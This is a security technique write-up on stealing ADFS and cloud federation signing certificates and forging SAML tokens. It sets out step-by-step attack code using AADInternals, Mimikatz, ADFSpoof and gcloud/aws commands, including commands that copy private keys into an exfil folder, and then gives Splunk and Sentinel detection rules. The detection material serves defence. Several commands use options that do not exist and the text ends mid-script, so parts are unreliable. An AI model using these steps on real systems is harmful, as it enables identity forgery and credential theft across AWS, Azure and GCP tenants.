# CA-UNSC-020: Multi-Cloud Federation Certificate Theft

## 1. METADATA HEADER

| Property | Value |
|----------|-------|
| **SERVTEP ID** | CA-UNSC-020 |
| **Technique Title** | Multi-Cloud Federation Certificate Theft |
| **MITRE ATT&CK ID** | T1552.004 - Unsecured Credentials: Private Keys |
| **CVE Reference** | N/A (Configuration-based, not CVE) |
| **Platforms** | AWS, Azure (Entra ID/ADFS), GCP, Multi-Cloud Environments |
| **Required Access Level** | Administrator / Service Account Access to IdP |
| **Attack Category** | Credential Access (TA0006) |
| **Technique Viability** | **ACTIVE** - Widely exploited in multi-cloud deployments (SolarWinds, APT29) |
| **Kill Chain Phase** | Credential Access → Lateral Movement → Persistence |
| **First Reported** | CyberArk (2017) - Golden SAML; APT29/SolarWinds (2020) |
| **Related Techniques** | T1606.002 (Forge SAML Response), T1550.001 (Token Impersonation), T1098 (Account Manipulation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**CA-UNSC-020** describes the theft of cryptographic certificates and private keys used in multi-cloud federation infrastructures, enabling attackers to forge authentication tokens and impersonate any user across federated cloud services without additional credentials or MFA. This technique leverages misconfigurations in trust relationships between cloud identity providers (AWS IAM, Azure Entra ID, GCP Workload Identity) and compromises the signing certificates that authenticate users to cloud resources.

**Impact Severity: CRITICAL**
- Persistent access to all federated cloud services
- Complete bypass of MFA and access controls
- Lateral movement across AWS, Azure, GCP, and SaaS platforms
- Data exfiltration via OAuth/SAML token manipulation
- Widely exploited in supply chain attacks (SolarWinds breach, 2020)

**Threat Actor Profile:**
- Nation-state APT groups (APT29, Lazarus)
- Supply chain attackers
- Insider threats with admin access to identity infrastructure

---

## 3. TECHNICAL PREREQUISITES

### Environmental Requirements

#### On-Premises / Hybrid Identity Infrastructure
- **Active Directory Federation Services (ADFS)** server (Windows Server 2016+)
- **Azure AD Connect** (if syncing on-premises AD to Entra ID)
- **Certificate Services (ADCS)** or external PKI for certificate issuance

#### Cloud Identity Providers
- **AWS:** Cross-account IAM roles, SAML IdP configuration, or IAM Roles Anywhere
- **Azure:** Entra ID (formerly Azure AD) with federated domain configuration
- **GCP:** Workload Identity Federation (WIF) pools and providers

#### Attacker Capabilities Required
1. **Initial Compromise:** Administrative or privileged access to ADFS, AD Connect server, or cloud identity service
2. **Certificate Location Knowledge:** Understanding where private keys are stored (DKMS, Key Vault, AWS Secrets Manager)
3. **Cryptographic Understanding:** Ability to extract, decrypt, and utilize private keys for token signing
4. **Multi-Cloud Access:** Knowledge of SAML/OIDC/AWS federation protocols

### Prerequisites Checklist
- [ ] ADFS/Azure AD Connect server compromise achieved
- [ ] Domain administrator or ADFS service account credentials obtained
- [ ] Access to Distributed Key Management Service (DKMS) or Key Vault
- [ ] Network access to certificate stores and metadata repositories
- [ ] Understanding of target cloud federation trust relationships

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Phase 1: Identify Federation Infrastructure

#### Active Directory Federation Services Discovery
```powershell
# Identify ADFS servers in the environment
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.Filter = "(|(servicePrincipalName=host/sts.*))"
$searcher.FindAll() | Select-Object Path

# Alternative: Query DNS for ADFS endpoints
nslookup sts.contoso.com
nslookup adfs.contoso.com

# Check AD for ADFS objects
Get-ADObject -Filter 'Name -like "ADFS*"' -Properties *
```

#### Azure AD / Entra ID Federation Discovery
```powershell
# Connect to Azure AD
Connect-MgGraph -Scopes "Organization.Read.All"

# List federated domains
Get-MgOrganization | Select-Object Id, DisplayName

# Check for external identity providers
Get-MgIdentityProvider

# List configured app registrations with federation
Get-MgApplication | Where-Object {$_.TokenEncryptionKeyId}
```

#### GCP Workload Identity Federation Reconnaissance
```bash
# List workload identity pools in GCP project
gcloud iam workload-identity-pools list --location=global

# Enumerate identity pool providers
gcloud iam workload-identity-pools providers list \
  --location=global \
  --workload-identity-pool=POOL_ID

# Check service accounts with WIF bindings
gcloud iam service-accounts get-iam-policy SA_EMAIL
```

#### AWS Federation Discovery
```bash
# List SAML providers in AWS
aws iam list-saml-providers

# Get SAML provider metadata
aws iam get-saml-provider --saml-provider-arn <ARN>

# Check IAM Roles Anywhere trust anchors
aws rolesanywhere list-trust-anchors

# Enumerate federated users/roles
aws iam list-role-tags --role-name FederatedRole
```

### Phase 2: Identify High-Value Targets

#### ADFS Service Account Enumeration
```powershell
# Find ADFS service account
Get-ADServiceAccount -Filter 'Name -like "*ADFS*"'

# Check ADFS service startup account
wmic service where name="adfssrv" get startname

# Identify accounts with permissions to DKMS
Get-ADObject -Filter 'Name -eq "DKMS"' -Properties ntSecurityDescriptor | 
  Select-Object -ExpandProperty ntSecurityDescriptor
```

#### Certificate Store Inventory
```powershell
# List all certificates in ADFS certificate store
Get-AdfsCertificate | Select-Object CertificateHash, Thumbprint, Subject

# Enumerate federation trust relationships
Get-AdfsRelyingPartyTrust | Select-Object Identifier, SamlMetadataAddress

# Check for secondary/rollover certificates
Get-AdfsCertificate -CertificateType Token-Decryption
```

#### Service Principal Name (SPN) Analysis
```powershell
# Find ADFS SPNs
Get-ADObject -Filter 'servicePrincipalName -like "*sts*"' | 
  Select-Object -ExpandProperty servicePrincipalName
```

---

## 5. ATTACK EXECUTION METHODS

### Method 1: Golden SAML - Direct Certificate Extraction from ADFS

**Attack Flow:**
1. Compromise ADFS admin account (via phishing, credential dumping, or local admin compromise)
2. Export ADFS token signing certificate and encrypted key
3. Decrypt private key using DKMS access
4. Forge SAML responses and authenticate to federated services (O365, AWS, Salesforce)

#### Step 1: Gain Administrative Access to ADFS Server

```powershell
# Execute on ADFS server with admin privileges
# Option A: If you have admin access via RDP/PSRemoting

# Option B: If you have compromised service account, use Runas
runas /user:CONTOSO\AdfsServiceAccount powershell.exe

# Option C: If you have DA credentials, use UAC bypass + privilege escalation
# (Requires running as DA first)
```

#### Step 2: Export Token Signing Certificate

**Method A: Using AADInternals PowerShell Module**
```powershell
# Install AADInternals
Install-Module -Name AADInternals -Force

# Import the module
Import-Module AADInternals -Force

# Export ADFS token signing and encryption certificates
Export-AADIntADFSCertificates

# Certificates will be exported as:
# - ADFS_signing.pfx
# - ADFS_encryption.pfx

# View exported certificates
Get-ChildItem | Where-Object {$_ -like "ADFS*"}

# Extract certificate details
$cert = Get-PfxData -FilePath ".\ADFS_signing.pfx"
$cert.OtherCertificates
```

**Method B: Using CertUtil (Native Windows)**
```cmd
# List certificates in ADFS store
certutil -store My

# Export by thumbprint
certutil.exe -exportPFX -p Password123! <Thumbprint> C:\Temp\adfs_cert.pfx

# If using Hardware Security Module (HSM), export with HSM pin
certutil -exportPFX -p Password123! -enterprise <Thumbprint> output.pfx
```

**Method C: Using Mimikatz**
```cmd
# Extract certificates from Windows certificate store
mimikatz # crypto::certificates /systemstore:local_machine /store:my /export

# Output location: .pfx files in current directory
# Mimikatz will export all certificates including ADFS token-signing cert
```

**Method D: Querying AD for Certificates (If Domain Joined)**
```powershell
# Retrieve ADFS configuration from Active Directory
# The configuration is stored in CN=ADFS,CN=Services,CN=Configuration

$DN = "CN=ADFS,CN=Services,CN=Configuration,DC=contoso,DC=com"
Get-ADObject -Identity $DN -Properties * | Select-Object *

# Export AD-stored certificates
certutil -store AD <Thumbprint>
```

#### Step 3: Extract Private Key from DKMS (Distributed Key Management Service)

The DKMS stores the encrypted private key. To decrypt it, you need the DKMS password or DK password.

**Method A: Using AADInternals (Automated)**
```powershell
# AADInternals automatically handles DKMS decryption
# If running on ADFS server with appropriate permissions

# Get DKMS configuration
Get-AADIntADFSConfiguration | Select-Object DKMSSettings

# Export with automatic decryption
Export-AADIntADFSCertificates -IncludePrivateKeys $true

# Result: Exportable .pfx files with private keys
```

**Method B: Remote DKMS Extraction (Requires Domain Admin)**
```powershell
# Step 1: Get ADFS service account NT hash via DCSync
Import-Module AADInternals
$ADFSAccount = Get-ADServiceAccount -Filter 'Name -like "*ADFS*"'
$NTHash = Get-AADIntADUserNTHash -ObjectGuid $ADFSAccount.ObjectGuid -Credentials $DomainAdminCreds

# Step 2: Export ADFS configuration using the hash
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $NTHash -SID $ADFSAccount.Objectsid.Value

# Step 3: Extract DKMS decryption key from AD
$Configuration = [xml]$ADFSConfig
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
$base = "LDAP://CN=$group,$container"

# Query AD for CryptoPolicy object
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
$ADSearch.Filter = '(name=CryptoPolicy)'
$ADSearch.PropertiesToLoad.Add("displayName")
$aduser = $ADSearch.FindOne()
$keyObjectGuid = $ADUser.Properties["displayName"][0]

# Retrieve encryption key from thumbnail photo
$ADSearch.PropertiesToLoad.Clear()
$ADSearch.PropertiesToLoad.Add("thumbnailphoto")
$ADSearch.Filter = "(l=$keyObjectGuid)"
$aduser = $ADSearch.FindOne()
$decryptionKey = [byte[]]$aduser.Properties["thumbnailphoto"][0]

# Step 4: Decrypt and export certificates
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $decryptionKey
```

**Method C: Using ADFSDump (Third-Party Tool)**
```powershell
# Download ADFSDump from https://github.com/fireeye/ADFSDump
# Run on ADFS server with admin/service account privileges

.\ADFSDump.exe

# Output:
# - ADFS_encryption.pfx
# - ADFS_signing.pfx
# - Decrypted private keys
# - Relying Party (RP) configuration details
```

#### Step 4: Forge SAML Response and Authenticate

**Using AADInternals:**
```powershell
# Convert exported certificate to format usable for token signing
$pfxPath = ".\ADFS_signing.pfx"
$pfxPassword = ""

# Create SAML assertion
$samlAssertion = Get-AADIntADFSSAMLAssertion -Certificate (Get-PfxData -FilePath $pfxPath).EndEntityCertificates[0] `
    -Subject "testuser@contoso.com" `
    -Audience "urn:amazon:webservices" `
    -Issuer "http://sts.contoso.com/adfs/services/trust" `
    -NameIDFormat "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"

Write-Host "Forged SAML Assertion:" $samlAssertion
```

**Using ADFSpoof (Mandiant Tool):**
```powershell
# Download from Mandiant: https://github.com/mandiant/ADFSpoof

# Create WS-FED response
.\ADFSpoof.exe --assertionfile federation_assertion.xml `
    --outputfile ws_fed_response.xml `
    --pfxfile ADFS_signing.pfx `
    --pfxpassword "" `
    --signingalgorithm RS256

# The generated SAML response can then be used to authenticate to:
# - Microsoft 365 / Office 365
# - AWS (if SAML provider configured)
# - Salesforce, ServiceNow, or any SAML service provider
```

**Using BurpSuite to Intercept and Replay:**
```
1. Capture SAML authentication request in BurpSuite
2. Replace AuthnRequest with forged SAML response from ADFSpoof
3. Modify assertion to target desired user and service
4. Relay response to application
5. Result: Authenticated as target user without credentials
```

#### Step 5: Cross-Cloud Lateral Movement

**Authenticate to AWS via SAML:**
```bash
# Using aws-vault or similar SAML-to-STS bridge
aws-vault exec --assume-role-ttl 1h sts get-caller-identity \
    --saml-assertion $(cat forged_saml.xml)

# Or use boto3 with SAML assertion
aws sts assume-role-with-saml \
    --role-arn arn:aws:iam::123456789012:role/FederatedRole \
    --principal-arn arn:aws:iam::123456789012:saml-provider/ADFS \
    --saml-assertion "$(cat forged_saml_response.txt)"
```

**Authenticate to Azure / Office 365:**
```powershell
# Use generated token to authenticate to Microsoft 365
# The forged token appears legitimate to O365 as it's signed by trusted ADFS

# Access Exchange Online as compromised user
$cred = Get-AuthToken -SAMLAssertion $forgedToken
$session = New-ExchangeOnlineSession -Credential $cred
```

---

### Method 2: GCP Workload Identity Federation Exploitation

**Attack Prerequisites:**
- Access to external identity (AWS, Azure, or GitHub Actions) that is federated in GCP WIF pool
- OR permission to update WIF provider settings (`iam.workloadIdentityPoolProviders.update`)

#### Attack Flow: Exploit Misconfigured WIF Pool

```bash
# Step 1: Discover WIF pools and providers
gcloud iam workload-identity-pools list --location=global --project=TARGET_PROJECT

gcloud iam workload-identity-pools describe POOL_ID \
    --location=global \
    --project=TARGET_PROJECT

# Step 2: Get provider configuration
gcloud iam workload-identity-pools providers describe PROVIDER_ID \
    --workload-identity-pool=POOL_ID \
    --location=global \
    --project=TARGET_PROJECT
```

**Attack Scenario 1: Compromise AWS Account in WIF Provider**
```bash
# If WIF is configured to federate AWS account 123456789012
# And attacker has compromised that AWS account

# Create credentials file to exchange AWS credentials for GCP token
cat > credentials.json <<EOF
{
  "type": "external_account",
  "audience": "//iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/providers/aws-provider",
  "subject_token_type": "urn:ietf:params:aws:token-type:aws4_request",
  "service_account_impersonation_url": "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/VICTIM_SA@PROJECT_ID.iam.gserviceaccount.com:generateAccessToken",
  "token_url": "https://sts.googleapis.com/v1/token",
  "credential_source": {
    "environment_id": "aws1",
    "region_url": "http://169.254.169.254/latest/meta-data/placement/availability-zone",
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials",
    "regional_cred_verification_url": "https://sts.{region}.amazonaws.com?Action=GetCallerIdentity&Version=2011-06-15"
  }
}
EOF

# Step 3: Exchange AWS credentials for GCP service account token
export GOOGLE_APPLICATION_CREDENTIALS=credentials.json
gcloud auth application-default login

# Step 4: Access GCP resources as impersonated service account
gsutil ls gs://sensitive-bucket/
gcloud compute instances list --zone=us-central1-a
```

**Attack Scenario 2: Exploit Provider Update Permission**

```bash
# If attacker has iam.workloadIdentityPoolProviders.update permission

# Step 1: Create new malicious AWS provider linked to attacker's account
gcloud iam workload-identity-pools providers create-aws new-provider \
    --location=global \
    --workload-identity-pool=POOL_ID \
    --project=TARGET_PROJECT \
    --account-id=ATTACKER_AWS_ACCOUNT \
    --attribute-mapping="aws:account_id=account_id,aws:arn=arn,aws:username=assumed_role_name"

# Step 2: Service account now trusts attacker's AWS account
# Attacker can now assume victim's service account from their own AWS environment

# In attacker's AWS environment:
aws sts assume-role \
    --role-arn arn:aws:iam::ATTACKER_ACCOUNT:role/GCP-Federation-Role
```

---

### Method 3: Azure AD Connect Certificate Exploitation

**Attack Prerequisites:**
- Network access to Azure AD Connect server
- Ability to intercept/modify HTTPS traffic (MITM)
- Certificate authority to sign trusted certificates (ADCS)

#### Attack Flow: MITM via ADCS Certificate

```powershell
# Step 1: Enroll server authentication certificate from ADCS
# (Requires ADCS template exploitation or misconfig)

# Request certificate matching login.microsoftonline.com
certreq -new request.inf cert.cer

# Step 2: Set up HTTPS listener on attacker box
# serving malicious login.microsoftonline.com endpoint

# Step 3: Redirect Azure AD Connect traffic via:
# - DNS spoofing
# - ARP spoofing  
# - DHCP option 252 (Web Proxy Auto-Discovery)

# Step 4: Intercept sync service credentials
# When Azure AD Connect attempts to sync, it sends credentials in cleartext
# (if HTTPS inspection enabled with trusted cert)

# Step 5: Extract AAD Connector password
$connectorPassword = $intercepted_credentials.password

# Step 6: Use connector password to authenticate to Azure AD
Connect-MgGraph -ClientId "AADConnectorId" -Credential $connectorPassword
```

---

### Method 4: AWS IAM Roles Anywhere Certificate Theft

**Attack Prerequisites:**
- Access to workload running on external infrastructure (on-prem, other cloud)
- Trust anchor certificate available in workload environment
- IAM Roles Anywhere enabled in AWS account

#### Attack Flow: Extract and Misuse X.509 Certificate

```bash
# Step 1: Locate trust anchor certificate in workload
find / -name "*.pem" -o -name "*.crt" -o -name "*.p12" 2>/dev/null | 
    xargs grep -l "CERTIFICATE"

# Typical locations:
# /opt/workload/certs/
# /etc/ssl/certs/
# ~/.ssh/

# Step 2: Extract certificate and private key
openssl pkcs12 -in workload_cert.p12 -out extracted_cert.pem -nodes

# Step 3: Use certificate to authenticate to AWS
# AWS SDK automatically picks up certificate from environment

export AWS_ROLE_ARN="arn:aws:iam::ACCOUNT:role/Workload-Role"
export AWS_CERTIFICATE_ARN="arn:aws:rolesanywhere:region:ACCOUNT:certificate/CERT_ID"

# Step 4: Assume role using certificate
aws sts assume-role \
    --role-arn arn:aws:iam::ACCOUNT:role/Workload-Role \
    --role-session-name attacker-session \
    --certificate extracted_cert.pem
```

---

## 6. TOOLS & COMMANDS REFERENCE

| Tool | Purpose | Command | Platform |
|------|---------|---------|----------|
| **Mimikatz** | Certificate extraction from Windows store | `crypto::certificates /systemstore:local_machine /export` | Windows |
| **AADInternals** | ADFS certificate export & SAML forging | `Export-AADIntADFSCertificates` | Windows PowerShell |
| **ADFSDump** | Remote DKMS key extraction | `ADFSDump.exe` (requires admin) | Windows |
| **ADFSpoof** | Forge SAML/WS-FED responses | `ADFSpoof.exe --assertionfile ...` | Windows |
| **CertUtil** | Windows native certificate management | `certutil -exportPFX` | Windows |
| **gcloud** | GCP workload identity federation enumeration | `gcloud iam workload-identity-pools list` | Cross-platform |
| **aws-cli** | AWS SAML provider and STS operations | `aws iam list-saml-providers` | Cross-platform |
| **aws-vault** | SAML assertion handling for AWS | `aws-vault exec --assume-role ...` | Cross-platform |
| **Azure CLI** | Entra ID federation configuration | `az ad app list --query "[].id"` | Cross-platform |
| **Python Boto3** | AWS API interaction with SAML | `sts.assume_role_with_saml()` | Cross-platform |

---

## 7. ATOMIC RED TEAM TESTS

### Test 1: Certificate Discovery and Enumeration

**Platforms:** Windows, Linux, macOS

```powershell
# Windows: Enumerate certificates in system store
Get-ChildItem Cert:\LocalMachine\My | Select-Object Thumbprint, Subject, Issuer

# Linux: Find SSH keys
find ~/.ssh -type f -name "id_*" 2>/dev/null

# macOS: Dump Keychain certificates
security find-certificate -a -c ADFS ~/Library/Keychains/login.keychain-db
```

**Expected Artifacts:**
- Certificate thumbprints
- Subject DN matching federated identity
- Issuer matching ADFS or cloud IdP

---

### Test 2: ADFS Certificate Export

**Platforms:** Windows (ADFS Server)

```powershell
# Requires: Administrator access on ADFS server

# Method A: PowerShell certificate export
$cert = Get-Item -Path "Cert:\LocalMachine\My\THUMBPRINT"
$pfxPath = "C:\Temp\exported.pfx"
Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd

# Method B: CertUtil export
certutil -exportPFX -p "password123" THUMBPRINT "C:\Temp\cert.pfx"

# Verify export
Get-PfxData -FilePath "C:\Temp\cert.pfx" | Select-Object -ExpandProperty EndEntityCertificates
```

**MITRE ATT&CK Mapping:**
- T1552.004: Private Keys
- T1552.001: Credentials in Files (if .pfx saved to disk)

---

### Test 3: Private Key Files Discovery (T1552.004 Atomic)

**Platforms:** Linux, macOS

```bash
# Find common private key file extensions
find / -type f \( -name "*.key" -o -name "*.pem" -o -name "*.pgp" \
    -o -name "*.gpg" -o -name "*.ppk" -o -name "*.p12" \) 2>/dev/null

# Search specific directories
find ~/.ssh -type f -readable 2>/dev/null
find ~/.gnupg -type f -readable 2>/dev/null
find /etc/ssl -type f -name "*key*" 2>/dev/null

# Copy discovered keys
mkdir /tmp/exfil
find ~/.ssh -name id_rsa -exec cp {} /tmp/exfil \;
```

**Expected Output:**
- SSH private keys (id_rsa, id_ed25519)
- GPG keys (.gnupg/)
- TLS certificates (.pem, .cer)
- PKCS#12 containers (.pfx, .p12)

---

### Test 4: Mimikatz Certificate Export

**Platforms:** Windows

```cmd
# Extract certificates from certificate store
mimikatz.exe "crypto::certificates /systemstore:local_machine /store:my /export" exit

# Output location: current directory with format <subject_CN>.pfx
# Can filter for federation certificates
dir | findstr /i "ADFS|federation|signing"
```

---

### Test 5: GCP WIF Exploitation Test

**Platforms:** Linux, macOS, Windows

```bash
# Step 1: Create external account credentials file
cat > gcp_creds.json <<EOF
{
  "type": "external_account",
  "audience": "//iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/providers/aws",
  "subject_token_type": "urn:ietf:params:aws:token-type:aws4_request",
  "service_account_impersonation_url": "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/SA@PROJECT.iam.gserviceaccount.com:generateAccessToken",
  "token_url": "https://sts.googleapis.com/v1/token",
  "credential_source": {
    "environment_id": "aws1",
    "region_url": "http://169.254.169.254/latest/meta-data/placement/availability-zone",
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials"
  }
}
EOF

# Step 2: Exchange for GCP token
export GOOGLE_APPLICATION_CREDENTIALS=gcp_creds.json
gcloud auth application-default print-access-token
```

---

## 8. SPLUNK DETECTION RULES

### Splunk Rule 1: ADFS Certificate Export Detection

**Data Source:** Windows Event Logs (Security, CertificateServicesClient-Lifecycle)

```spl
sourcetype="WinEventLog:Microsoft-Windows-CertificateServicesClient-Lifecycle-System" 
EventID=1007 
| search CertificateMetaData="*ADFS*" OR Subject="*sts.*"
| stats count by Computer, User, CertificateName, EventID
| where count > 0
```

**Alternative (PowerShell Script Block Logging):**

```spl
sourcetype="WinEventLog:PowerShell" EventID=4103
(ScriptBlockText="*Export-PfxCertificate*" OR 
 ScriptBlockText="*certutil*-exportPFX*" OR
 ScriptBlockText="*Export-AADIntADFSCertificates*")
| stats count, values(User), values(Computer) by ScriptBlockText
| alert
```

**False Positives:**
- Legitimate certificate rotation by administrators
- Automated certificate management scripts
- Backup solutions extracting certificates

**Tuning:**
```spl
sourcetype="PowerShell" EventID=4103 ScriptBlockText="*exportPFX*"
| where NOT (User IN ("svc_adfs*", "backup_account*"))
| where NOT (Computer IN ("cert-mgmt*"))
```

---

### Splunk Rule 2: DKMS Access Correlation

**Data Sources:** Security Event ID 4662 (Directory Service Object Access)

```spl
sourcetype="WinEventLog:Security" EventID=4662
ObjectName="*DKMS*" 
(AccessMask=256 OR AccessMask=4098)  // QueryValue / QuerySecurityDescriptor
| stats count, values(SubjectUserName), values(Computer) by ObjectName, AccessMask
| search count > 3  // Anomalous repeated access
```

**Alert Condition:**
```spl
| where NOT (SubjectUserName="ADFS_SERVICE_ACCOUNT") 
| alert priority=high
```

---

### Splunk Rule 3: Forged SAML Token Detection

**Data Source:** ADFS Operational Logs

```spl
sourcetype="ADFS" EventID=501  // Successful federation login
| stats count, values(ClientIP), values(UserPrincipalName) by DeviceId
| search NOT (DeviceId IN ("expected_device_ids"))
| append [
    search sourcetype="ADFS" EventID=100  // Token generation
    | stats count by UserPrincipalName
]
| where (count_from_501 > 0 AND count_from_100 = 0)  // Token used but not generated
```

---

### Splunk Rule 4: Anomalous Workload Identity Federation Usage (GCP)

**Data Source:** GCP Cloud Audit Logs

```spl
source="gcp:audit" logName="*iam.googleapis.com*"
methodName="*workloadIdentityPoolProviders*" 
(methodName="*.create" OR methodName="*.update")
| stats count, values(protoPayload.authenticationInfo.principalEmail) 
  by protoPayload.methodName, protoPayload.resourceName
| where count > 1  // Multiple changes indicate anomaly
```

---

### Splunk Rule 5: AWS SAML Provider Modification Detection

**Data Source:** AWS CloudTrail

```spl
source="aws_cloudtrail" eventName IN ("CreateSAMLProvider", "UpdateSAMLProvider", "DeleteSAMLProvider")
| stats count, values(awsRegion), values(sourceIPAddress) by eventName, userIdentity.principalId
| search count > 2 OR sourceIPAddress NOT IN ("office_IPs*")
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Sentinel Query 1: ADFS Certificate Export Attempt

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, Computer, SubjectUserName, CommandLine
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** ADFS Servers (Windows Server 2016+)

**KQL Query:**

```kusto
SecurityEvent
| where EventID in (4688, 4103)  // Process Creation or PowerShell Script Block
| where CommandLine contains "certutil" and CommandLine contains "exportPFX"
   or ScriptBlockText contains "Export-PfxCertificate"
   or ScriptBlockText contains "Export-AADIntADFSCertificates"
| where SubjectUserName != "SYSTEM" and SubjectUserName != "ADFS_SERVICE_ACCOUNT"
| project TimeGenerated, Computer, SubjectUserName, CommandLine, ScriptBlockText
| summarize count() by Computer, SubjectUserName
| where count_ > 0
```

**What This Detects:**
- Non-SYSTEM account executing certificate export commands
- PowerShell-based certificate extraction attempts
- Use of CertUtil or AADInternals export functions

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `ADFS Certificate Export Attempt`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping: Group incidents by SubjectUserName, Computer
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**

```powershell
# Connect to Sentinel
Connect-AzAccount
$ResourceGroup = "SecurityResourceGroup"
$WorkspaceName = "SentinelWorkspace"

# Define the KQL query
$query = @"
SecurityEvent
| where EventID in (4688, 4103)
| where CommandLine contains "certutil" and CommandLine contains "exportPFX"
   or ScriptBlockText contains "Export-PfxCertificate"
| where SubjectUserName != "SYSTEM"
| project TimeGenerated, Computer, SubjectUserName, CommandLine
| summarize count() by Computer, SubjectUserName
"@

# Create the alert rule
$alertRuleParams = @{
    ResourceGroupName = $ResourceGroup
    WorkspaceName = $WorkspaceName
    DisplayName = "ADFS Certificate Export Attempt"
    Description = "Detects attempts to export ADFS signing certificates"
    Query = $query
    Severity = "Critical"
    Frequency = "PT5M"
    Period = "PT1H"
    Enabled = $true
}

New-AzSentinelAlertRule @alertRuleParams
```

**Reference:** [Microsoft Sentinel Query Language (KQL) Docs](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/)

---

### Sentinel Query 2: DKMS Private Key Access

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ObjectName, SubjectUserName, AccessMask
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** ADFS Servers

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4662  // Directory Service Object Access
| where ObjectName contains "DKMS" and ObjectName contains "PrivateKey"
| where AccessMask in (256, 4098)  // QueryValue, SetValue
| where NOT (SubjectUserName contains "ADFS_" or SubjectUserName == "SYSTEM")
| project TimeGenerated, Computer, SubjectUserName, ObjectName, AccessMask
| summarize AccessCount=count() by Computer, SubjectUserName, ObjectName
| where AccessCount > 1
```

---

### Sentinel Query 3: Suspicious SAML Token Usage (No Corresponding Kerberos)

**Rule Configuration:**
- **Required Table:** SecurityEvent, SigninLogs
- **Alert Severity:** High
- **Frequency:** Hourly

**KQL Query:**

```kusto
// Find SAML-based logins to cloud apps
SigninLogs
| where AuthenticationProtocol == "SAML"
| project TimeGenerated, UserPrincipalName, ClientAppUsed, AppDisplayName, IPAddress
| join kind=leftanti (
    SecurityEvent
    | where EventID in (4769, 4768)  // Kerberos Service/TGT request
    | project TimeGenerated, UserPrincipalName = TargetUserName
) on UserPrincipalName
| where TimeGenerated > ago(1h)
| summarize SAMLLoginCount=count() by UserPrincipalName, AppDisplayName, IPAddress
| where SAMLLoginCount > 0
```

**Alert Condition:** SAML login without corresponding on-premises Kerberos event = potential Golden SAML

---

### Sentinel Query 4: Workload Identity Federation Abuse (GCP)

**Rule Configuration:**
- **Required Table:** AzureActivity (or GCP Audit Logs if integrated)
- **Alert Severity:** High

**KQL Query:**

```kusto
AzureActivity
| where OperationNameValue contains "workloadIdentityPool"
| where OperationNameValue in ("Create workload identity pool", "Update workload identity pool provider")
| where ActivityStatusValue == "Succeeded"
| where NOT (Caller in ("authorized_admin_emails*"))
| project TimeGenerated, Caller, OperationNameValue, ResourceProviderValue
| summarize count() by Caller, OperationNameValue
| where count_ > 1
```

---

## 10. WINDOWS EVENT LOG MONITORING

### Event Log 1: Certificate Export Detection

**Event ID:** 1007 (Certificate Services Client – Lifecycle Event)

- **Log Source:** Microsoft-Windows-CertificateServicesClient-Lifecycle-System
- **Trigger:** Certificate exported from store
- **Filter:** "CertificateMetaData contains ADFS OR Subject contains sts"
- **Applies To:** Windows Server 2016+

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Navigate to **System Audit Policies** → **System**
4. Enable: **Audit Security System Extension** (Success and Failure)
5. Enable: **Audit Other System Events** (Success and Failure)
6. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy):**

```powershell
# Enable Certificate Services Client lifecycle event logging
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable

# Verify
auditpol /get /category:* | grep -i "certification"

# View logs
Get-WinEvent -LogName "Microsoft-Windows-CertificateServicesClient-Lifecycle-System/Operational" -MaxEvents 10
```

---

### Event Log 2: ADFS Token Signing Event Correlation

**Event ID:** 4769 (Kerberos Service Ticket Requested)

- **Log Source:** Security
- **Trigger:** Service ticket requested for ADFS
- **Filter:** "Service=krbtgt OR Service=sts*"
- **Applies To:** Domain Controller, ADFS Server

**Detection Strategy:**
```
Correlated Events:
1. Event 4769 (Kerberos TGT/Service ticket) on DC
2. ADFS Event 501 (Federation login) on ADFS server

GOLDEN SAML = Event 501 WITHOUT Event 4769
```

---

### Event Log 3: DKMS Registry Access

**Event ID:** 4657 (Registry Value Modification)

- **Log Source:** Security
- **Trigger:** DKMS registry key accessed
- **Filter:** "ObjectName contains HKLM\System\CurrentControlSet\Services\ADFS\Config\DKMS"
- **Applies To:** ADFS Server

**Manual Configuration:**

```powershell
# Enable Registry Audit on ADFS DKMS key
auditpol /set /subcategory:"Registry" /success:enable /failure:enable

# Set ACL audit on specific registry key
$registryPath = "HKLM:\System\CurrentControlSet\Services\ADFS\Config"
$acl = Get-Acl -Path $registryPath
$rule = New-Object System.Security.AccessControl.RegistryAuditRule(
    "Everyone",
    "QueryValues",
    "ContainerInherit,ObjectInherit",
    "None",
    "Success"
)
$acl.AddAuditRule($rule)
